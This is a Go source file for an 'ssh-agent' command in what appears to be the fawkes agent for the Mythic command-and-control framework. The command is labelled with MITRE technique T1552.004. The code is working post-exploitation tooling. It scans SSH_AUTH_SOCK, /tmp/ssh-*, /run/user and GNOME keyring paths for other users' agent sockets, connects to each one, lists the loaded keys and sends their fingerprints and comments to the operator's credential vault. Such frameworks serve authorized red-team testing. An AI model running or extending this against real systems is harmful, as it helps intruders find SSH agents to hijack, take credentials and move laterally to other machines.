//go:build !windows

package commands

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/agent"
)

type SSHAgentCommand struct{}

func (c *SSHAgentCommand) Name() string        { return "ssh-agent" }
func (c *SSHAgentCommand) Description() string { return "Enumerate SSH agent sockets and list loaded keys (T1552.004)" }

type sshAgentArgs struct {
	Action string `json:"action"` // "list" (default), "enum"
	Socket string `json:"socket"` // optional: specific socket path
}

func (c *SSHAgentCommand) Execute(task structs.Task) structs.CommandResult {
	var args sshAgentArgs

	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			args.Action = strings.TrimSpace(task.Params)
		}
	}
	if args.Action == "" {
		args.Action = "list"
	}

	switch strings.ToLower(args.Action) {
	case "list":
		return sshAgentList(args)
	case "enum":
		return sshAgentEnum()
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s. Use: list, enum", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

// sshAgentEnum discovers SSH agent sockets without connecting to them.
func sshAgentEnum() structs.CommandResult {
	sockets := discoverAgentSockets()
	if len(sockets) == 0 {
		return structs.CommandResult{
			Output:    "No SSH agent sockets found",
			Status:    "success",
			Completed: true,
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Found %d SSH agent socket(s):\n\n", len(sockets)))
	for _, s := range sockets {
		sb.WriteString(fmt.Sprintf("  %s  (%s)\n", s.Path, s.Source))
	}
	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// sshAgentList connects to agent sockets and lists loaded keys.
func sshAgentList(args sshAgentArgs) structs.CommandResult {
	var sockets []agentSocket

	if args.Socket != "" {
		// User specified a socket path
		sockets = []agentSocket{{Path: args.Socket, Source: "user-specified"}}
	} else {
		sockets = discoverAgentSockets()
	}

	if len(sockets) == 0 {
		return structs.CommandResult{
			Output:    "No SSH agent sockets found. Set SSH_AUTH_SOCK or specify -socket.",
			Status:    "success",
			Completed: true,
		}
	}

	var sb strings.Builder
	var allCreds []structs.MythicCredential
	totalKeys := 0

	for _, s := range sockets {
		keys, err := listAgentKeys(s.Path)
		if err != nil {
			sb.WriteString(fmt.Sprintf("Socket: %s (%s)\n  Error: %v\n\n", s.Path, s.Source, err))
			continue
		}

		sb.WriteString(fmt.Sprintf("Socket: %s (%s) — %d key(s)\n", s.Path, s.Source, len(keys)))
		if len(keys) == 0 {
			sb.WriteString("  (no keys loaded)\n\n")
			continue
		}

		for _, k := range keys {
			totalKeys++
			sb.WriteString(fmt.Sprintf("  [%d] %s %s", totalKeys, k.Type, k.Fingerprint))
			if k.Bits > 0 {
				sb.WriteString(fmt.Sprintf(" (%d bits)", k.Bits))
			}
			if k.Comment != "" {
				sb.WriteString(fmt.Sprintf(" — %s", k.Comment))
			}
			sb.WriteString("\n")

			// Report key fingerprints to Mythic credential vault
			credValue := fmt.Sprintf("type=%s fingerprint=%s socket=%s", k.Type, k.Fingerprint, s.Path)
			allCreds = append(allCreds, structs.MythicCredential{
				CredentialType: "key",
				Realm:          "ssh-agent",
				Account:        k.Comment,
				Credential:     credValue,
				Comment:        fmt.Sprintf("ssh-agent: %s key from %s", k.Type, s.Path),
			})
		}
		sb.WriteString("\n")
	}

	result := structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
	if len(allCreds) > 0 {
		result.Credentials = &allCreds
	}
	return result
}

// agentSocket represents a discovered SSH agent socket.
type agentSocket struct {
	Path   string // filesystem path to the Unix socket
	Source string // how it was found (env, scan)
}

// agentKeyInfo holds parsed key information from an SSH agent.
type agentKeyInfo struct {
	Type        string // key type (ssh-ed25519, ssh-rsa, etc.)
	Fingerprint string // SHA256 fingerprint
	Bits        int    // key bit length (0 if unknown)
	Comment     string // key comment (often user@host)
}

// discoverAgentSockets finds SSH agent sockets on the system.
func discoverAgentSockets() []agentSocket {
	seen := make(map[string]bool)
	var sockets []agentSocket

	// 1. Check SSH_AUTH_SOCK environment variable
	if sockPath := os.Getenv("SSH_AUTH_SOCK"); sockPath != "" {
		if isUnixSocket(sockPath) {
			sockets = append(sockets, agentSocket{Path: sockPath, Source: "SSH_AUTH_SOCK"})
			seen[sockPath] = true
		}
	}

	// 2. Scan /tmp/ssh-*/agent.* (standard OpenSSH agent location)
	matches, _ := filepath.Glob("/tmp/ssh-*/agent.*")
	for _, m := range matches {
		if !seen[m] && isUnixSocket(m) {
			sockets = append(sockets, agentSocket{Path: m, Source: "scan:/tmp/ssh-*"})
			seen[m] = true
		}
	}

	// 3. Scan /run/user/*/ssh-agent.* (systemd user sessions)
	runMatches, _ := filepath.Glob("/run/user/*/ssh-agent.*")
	for _, m := range runMatches {
		if !seen[m] && isUnixSocket(m) {
			sockets = append(sockets, agentSocket{Path: m, Source: "scan:/run/user"})
			seen[m] = true
		}
	}

	// 4. Scan /run/user/*/keyring/ssh (GNOME Keyring agent)
	gnomeMatches, _ := filepath.Glob("/run/user/*/keyring/ssh")
	for _, m := range gnomeMatches {
		if !seen[m] && isUnixSocket(m) {
			sockets = append(sockets, agentSocket{Path: m, Source: "scan:gnome-keyring"})
			seen[m] = true
		}
	}

	return sockets
}

// listAgentKeys connects to an SSH agent socket and lists loaded identities.
func listAgentKeys(socketPath string) ([]agentKeyInfo, error) {
	conn, err := net.DialTimeout("unix", socketPath, 5*time.Second)
	if err != nil {
		return nil, fmt.Errorf("connect failed: %v", err)
	}
	defer conn.Close()

	// Set read deadline to avoid hanging on unresponsive sockets
	_ = conn.SetDeadline(time.Now().Add(10 * time.Second))

	client := agent.NewClient(conn)
	keys, err := client.List()
	if err != nil {
		return nil, fmt.Errorf("list keys failed: %v", err)
	}

	var result []agentKeyInfo
	for _, key := range keys {
		ki := agentKeyInfo{
			Type:        key.Type(),
			Fingerprint: fingerprintSHA256(key),
			Comment:     key.Comment,
		}
		// Parse the public key to get bit length
		if pk, err := ssh.ParsePublicKey(key.Marshal()); err == nil {
			switch pk.Type() {
			case "ssh-rsa":
				ki.Bits = len(key.Marshal()) * 8 / 10 // rough estimate
			case "ssh-ed25519":
				ki.Bits = 256
			case "ecdsa-sha2-nistp256":
				ki.Bits = 256
			case "ecdsa-sha2-nistp384":
				ki.Bits = 384
			case "ecdsa-sha2-nistp521":
				ki.Bits = 521
			}
		}
		result = append(result, ki)
	}

	return result, nil
}

// isUnixSocket checks if a path is a Unix domain socket.
func isUnixSocket(path string) bool {
	fi, err := os.Stat(path)
	if err != nil {
		return false
	}
	return fi.Mode().Type()&os.ModeSocket != 0
}

// fingerprintSHA256 computes the SSH-style SHA256 fingerprint of a public key.
func fingerprintSHA256(key *agent.Key) string {
	h := sha256.Sum256(key.Marshal())
	return "SHA256:" + base64.RawStdEncoding.EncodeToString(h[:])
}
